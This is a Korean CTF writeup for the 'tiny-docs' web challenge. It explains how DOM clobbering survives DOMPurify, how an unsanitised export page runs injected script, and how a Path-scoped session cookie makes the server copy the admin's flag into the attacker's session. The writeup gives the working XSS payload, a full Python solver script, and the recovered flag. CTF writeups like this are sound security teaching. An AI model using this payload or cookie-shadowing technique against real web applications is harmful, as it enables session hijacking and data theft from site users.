---
title: "HyperSonic CTF 2026 tiny-docs Writeup"
published: 2026-06-08
description: "HyperSonic CTF 2026 tiny-docs 문제 풀이."
category: "CTF/Wargame"
tags: ["HyperSonic CTF", "CTF", "Writeup", "Web"]
draft: false
listed: false
---

***SSG Writeup***

# tiny-docs

## 개요

`tiny-docs`는 짧은 HTML 문서를 만들고 관리자 봇에게 검토를 요청할 수 있는 웹 문제입니다. 사용자는 회원가입 후 문서를 생성할 수 있고, 생성된 `/doc/<uuid>` 경로를 `/report`로 보내면 관리자 권한의 Chromium이 해당 문서를 엽니다.

확인한 조건은 다음과 같습니다.

- 카테고리: `web`
- 문서 본문은 최대 `300`바이트입니다.
- 문서 본문에는 제한된 문자만 들어갈 수 있습니다.
- `/report`는 직접 `/download`나 `/flag`를 열 수 없고 `/doc/<uuid>` 형식만 허용합니다.
- `/flag`는 관리자 세션에서만 접근할 수 있습니다.

목표는 관리자 봇이 가진 권한으로 `/flag`를 방문하게 만들고, 그 결과가 공격자 세션으로 복사되도록 만드는 것입니다. 풀이에서 먼저 볼 부분은 같은 문서가 `/doc`와 `/download`에서 서로 다르게 처리된다는 점입니다.

## 문제 분석

글에서 사용할 용어를 먼저 정리합니다.

- `raw`: 사용자가 입력한 원본 문서 본문입니다.
- `doc`: `/doc/<uuid>`에서 렌더링되는 문서 페이지입니다.
- `download`: `/download/<uuid>`에서 반환되는 내보내기 페이지입니다.
- `sess`: 서버가 세션을 식별하는 쿠키 이름입니다.
- 공격자 세션: 일반 사용자로 가입했을 때 받은 세션입니다.
- 관리자 세션: 관리자 봇이 `/admin-login`을 거쳐 받은 세션입니다.
- `inbox`: 사용자 정보 조회에서 확인할 수 있는 서버 측 저장 공간입니다.

문서 생성 시 본문은 base64로 전달되지만, 서버는 디코딩한 `raw`에 대해 길이와 문자 집합을 검사합니다.

```js
const MAX_DOCUMENT_LENGTH = 300;
const DOCUMENT_BODY_RE = /^[\x00\xfe\xffA-Za-z0-9 '.\-\/;<=>]*$/;

const raw = atob(String(payload.body_b64 || ""));
if (raw.length > MAX_DOCUMENT_LENGTH) {
  ...
}
if (!DOCUMENT_BODY_RE.test(raw)) {
  ...
}
```

이 정규식은 괄호, 콜론, 큰따옴표를 허용하지 않습니다. 대신 알파벳, 숫자, 공백, 작은따옴표, 마침표, 하이픈, 슬래시, 세미콜론, `<`, `>`, `=`는 사용할 수 있습니다. 따라서 일반적인 JavaScript payload를 그대로 쓰기는 어렵지만, 태그와 단순 대입문은 구성할 수 있습니다.

문서 조회 페이지는 `raw`를 `DOMPurify`로 정화한 뒤 `article` 안에 넣습니다.

```js
function sanitizeMarkup(raw) {
  return DOMPurify.sanitize(String(raw), {
    USE_PROFILES: { html: true },
    ALLOW_DATA_ATTR: true,
  });
}

function docPage(id, doc) {
  const clean = sanitizeMarkup(doc.raw);
  ...
  return `...<article id="document">${clean}</article>...`;
}
```

이 화면에서 바로 `<script>`를 실행할 수는 없습니다. 실제로 다음과 같은 입력은 정화 후 앵커만 남고 스크립트는 제거됩니다.

```html
<a id=docSlot data-range=0></a><script>...</script>
```

정화 결과는 다음처럼 유지됩니다.

```html
<a data-range="0" id="docSlot"></a>
```

그런데 `/doc` 페이지에는 별도의 부트스트랩 스크립트가 있습니다.

```js
var x = window.docSlot;
if (x && x.dataset && /^\d{1,8}$/.test(x.dataset.range || "")) {
  location.href = "/download/<id>?range=" + x.dataset.range;
}
```

Chromium에서는 `id`를 가진 일부 요소가 `window.<id>` 형태의 named property로 노출됩니다. 따라서 정화된 `<a id=docSlot data-range=0>`만으로도 `window.docSlot`을 만들 수 있습니다. `data-range=0`은 숫자 검사를 통과하므로, 관리자 봇은 허용된 `/doc` 페이지를 연 뒤 같은 오리진의 `/download/<uuid>?range=0`으로 이동합니다.

`/download` 쪽 처리는 더 직접적입니다.

```js
function exportDocument(doc) {
  return EXPORT_PREFIX + doc.raw + EXPORT_SUFFIX;
}

const exported = exportDocument(doc);
const start = hasRange
  ? Math.max(0, Math.min(exported.length, Number(url.searchParams.get("range")) || 0))
  : 0;
const body = exported.slice(start);

send(res, 200, body, {
  "Content-Type": "text/html",
  "Content-Security-Policy": HTML_CSP,
}, "latin1");
```

여기서는 `doc.raw`를 다시 정화하지 않습니다. 응답도 `text/html`이고 CSP에는 `script-src 'self' 'unsafe-inline'`이 포함되어 있습니다. 즉 `/doc`에서는 제거되던 `<script>`가 `/download`에서는 그대로 실행됩니다.

세션 처리도 풀이에 중요합니다. 서버는 같은 이름의 `sess` 쿠키가 여러 개 있으면 요청 헤더에 먼저 나온 값을 현재 세션으로 사용합니다.

```js
function getSessionCandidates(req) {
  const out = [];
  for (const part of String(req.headers.cookie || "").split(";")) {
    ...
    if (key !== "sess") continue;
    const sid = decodeURIComponent(part.slice(index + 1).trim());
    const session = sessions.get(sid);
    if (session) out.push({ sid, session });
  }
  return out;
}

function getSession(req) {
  return getSessionCandidates(req)[0] || null;
}
```

`/flag`는 관리자 세션의 `inbox`에 flag를 저장한 뒤 `/download/collect`로 POST 요청을 보냅니다.

```js
function flagPage(auth) {
  auth.session.inbox = FLAG;
  return `...<script>fetch('/download/collect',{method:'POST',credentials:'same-origin'}).catch(()=>{})</script>...`;
}
```

그리고 `/download/collect`는 현재 세션과 다른 관리자 세션 후보를 찾아, 그 `inbox` 값을 현재 세션의 `inbox`로 복사합니다.

```js
const auth = getSession(req);
const candidates = getSessionCandidates(req);
const source = candidates.find((item) =>
  item.sid !== auth.sid && item.session.isAdmin && item.session.inbox
);
auth.session.inbox = source.session.inbox.slice(0, 256);
```

이 구조 때문에 쿠키의 `Path`를 이용할 수 있습니다. `/download`에서 실행되는 스크립트가 공격자 세션을 `Path=/download`인 `sess` 쿠키로 설정하면, 브라우저에는 다음 두 쿠키가 함께 존재합니다.

```text
sess=<attacker session>; Path=/download
sess=<admin session>; Path=/
```

`/flag` 요청에는 `Path=/download` 쿠키가 맞지 않으므로 관리자 세션만 전송됩니다. 그 결과 `/flag`는 정상적으로 관리자 `inbox`에 flag를 저장합니다. 이어서 `/download/collect` 요청이 발생하면 두 쿠키가 모두 전송되고, 더 구체적인 `/download` 쿠키가 먼저 옵니다. 서버는 공격자 세션을 현재 세션으로 선택하고, 뒤쪽 후보에 있는 관리자 세션에서 flag를 복사합니다.

## 핵심 아이디어

두 가지 차이를 연결하면 풀이 흐름이 만들어집니다.

첫째, `/report`는 `/doc/<uuid>`만 허용하지만 `/doc` 내부 스크립트가 `window.docSlot`을 신뢰합니다. 정화된 HTML 안에 `id=docSlot` 요소를 남기면 DOM clobbering으로 관리자 봇을 `/download`로 이동시킬 수 있습니다.

둘째, `/download`는 원본 문서 HTML을 그대로 렌더링합니다. 여기서 실행되는 스크립트는 관리자 쿠키를 읽을 수는 없지만, 같은 이름의 공격자 세션 쿠키를 더 구체적인 `Path`로 새로 설정할 수 있습니다. 이후 `/flag`와 `/download/collect`가 서로 다른 쿠키 선택 결과를 갖게 되면서 flag가 공격자 세션으로 옮겨집니다.

정리하면 전체 흐름은 다음과 같습니다.

```text
공격자 문서 생성
-> /doc/<uuid>에 DOM clobbering 요소 삽입
-> 관리자 봇이 /doc/<uuid> 방문
-> 부트스트랩 스크립트가 /download/<uuid>?range=0으로 이동
-> 원본 <script> 실행
-> Path=/download 공격자 sess 쿠키 설정
-> /flag 방문으로 관리자 inbox에 flag 저장
-> /download/collect에서 공격자 inbox로 flag 복사
-> /api/me로 공격자 inbox 확인
```

## 풀이 과정

### Step 1. 문서 입력 제한 확인

문서 본문은 `300`바이트 이하이고 `DOCUMENT_BODY_RE`를 통과해야 합니다. 이 제한 때문에 `fetch(...)`처럼 괄호가 필요한 코드는 사용할 수 없습니다. 대신 다음과 같은 대입문은 허용 문자 안에서 만들 수 있습니다.

```html
<script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

`document.cookie=...`로 쿠키를 설정하고, `location=...`으로 이동하는 방식이라 괄호가 필요하지 않습니다. 공격자 세션 ID는 `crypto.randomBytes(24).toString("hex")`로 만들어지는 48자리 16진수 문자열이므로 정규식 제한에도 걸리지 않습니다.

최종 문서 본문은 다음 구조를 사용합니다.

```html
<a id=docSlot data-range=0></a><script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

실제 세션 길이를 기준으로 payload는 `151`바이트였고, `300`바이트 제한 안에 들어갑니다.

### Step 2. `/doc`에서 `/download`로 이동시키기

`/report`는 `/doc/<uuid>`만 받기 때문에 관리자 봇에게 `/download`를 직접 열게 할 수 없습니다. 대신 `/doc` 페이지의 부트스트랩 스크립트를 이용합니다.

DOMPurify는 `<script>`를 제거하지만, `ALLOW_DATA_ATTR` 설정 때문에 `<a id=docSlot data-range=0>`는 남깁니다. Chromium에서 이 요소는 `window.docSlot`으로 접근할 수 있으므로 다음 검사를 만족합니다.

```js
var x = window.docSlot;
if (x && x.dataset && /^\d{1,8}$/.test(x.dataset.range || "")) {
  location.href = "/download/<id>?range=" + x.dataset.range;
}
```

`data-range=0`을 넣었기 때문에 이동 대상은 `/download/<uuid>?range=0`이 됩니다. `range=0`은 내보내기 페이지의 시작 위치를 그대로 유지하므로, 원본 문서에 들어 있던 `<script>`가 포함된 전체 HTML이 반환됩니다.

### Step 3. `/download`에서 공격자 세션 쿠키 설정하기

`/download`는 `exportDocument(doc)` 결과를 그대로 반환합니다. 이때 원본 `<script>`는 정화되지 않고 실행됩니다.

```html
<script>document.cookie='sess=<attacker session>;path=/download';location='/flag'</script>
```

이 스크립트는 관리자 세션 쿠키를 읽지 않습니다. 관리자 쿠키는 `HttpOnly`이므로 JavaScript에서 접근할 수 없지만, 같은 이름의 새 쿠키를 다른 `Path`로 설정하는 것은 가능합니다.

여기서 `Path=/download`를 선택하는 이유가 중요합니다. 공격자 쿠키가 `/flag`에 전송되면 `/flag`가 공격자 권한으로 처리되어 `403`이 됩니다. 반대로 `/download` 경로에만 맞도록 만들면 `/flag`에서는 관리자 세션이 유지되고, `/download/collect`에서는 공격자 쿠키가 관리자 쿠키보다 먼저 선택됩니다.

### Step 4. `/download/collect`로 flag 복사하기

관리자 세션으로 `/flag`에 접근하면 서버는 관리자 세션의 `inbox`에 flag를 저장합니다. 그 페이지는 곧바로 `/download/collect`에 POST 요청을 보냅니다.

이 요청의 쿠키 후보는 다음 순서가 됩니다.

```text
1. Path=/download 공격자 sess
2. Path=/ 관리자 sess
```

서버의 `getSession()`은 첫 번째 후보를 현재 세션으로 사용합니다. 이후 `/download/collect`는 나머지 후보 중 `isAdmin`이고 `inbox`가 있는 세션을 찾아 현재 세션으로 복사합니다. 따라서 `/api/me`를 공격자 세션으로 조회하면 `inbox`에서 flag를 확인할 수 있습니다.

## Exploit / Solver

최종 solver는 다음 순서로 동작합니다.

1. 임의 사용자로 가입해 공격자 `sess` 값을 얻습니다.
2. `docSlot` 앵커와 `/download`에서 실행될 `<script>`를 합쳐 문서를 만듭니다.
3. 생성된 `/doc/<uuid>`를 `/report`에 전달해 관리자 봇이 열게 합니다.
4. 잠시 후 `/api/me`를 조회해 `inbox`에 저장된 값을 읽습니다.

핵심 루틴은 다음과 같습니다. `base`, `username`, `password` 준비와 일부 예외 처리는 생략했습니다.

```python
import base64
import json
import re
import time
import urllib.parse
import urllib.request


def request(base, method, path, data=None, cookie=None, timeout=15):
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(
        urllib.parse.urljoin(base, path),
        data=body,
        headers=headers,
        method=method,
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")


def cookie_from(headers):
    raw = headers.get("Set-Cookie", "")
    match = re.search(r"\bsess=([^;]+)", raw)
    if not match:
        raise RuntimeError("missing sess cookie")
    return urllib.parse.unquote(match.group(1))


status, headers, _ = request(base, "POST", "/api/signup", {
    "username": username,
    "password": password,
})
sid = cookie_from(headers)

payload = (
    f"<a id=docSlot data-range=0></a>"
    f"<script>document.cookie='sess={sid};path=/download';location='/flag'</script>"
)

status, headers, body = request(base, "POST", "/api/documents", {
    "title": "tiny note",
    "filename": "export.html",
    "body_b64": base64.b64encode(payload.encode("latin1")).decode(),
}, cookie=f"sess={sid}")
doc_path = json.loads(body)["path"]

request(base, "POST", "/report", {"url": doc_path}, timeout=20)

for _ in range(8):
    status, headers, body = request(base, "GET", "/api/me", cookie=f"sess={sid}")
    inbox = json.loads(body).get("inbox", "")
    if inbox:
        print(inbox)
        break
    time.sleep(0.5)
```

## 결과

같은 방식을 테스트 실행에서 먼저 확인했을 때 테스트 flag가 공격자 `inbox`로 복사되었습니다. 이후 실제 서비스에서도 flag를 회수했습니다.

```text
HS{0d438c531a572a287482c30c687c1ce47b0ac560}
```
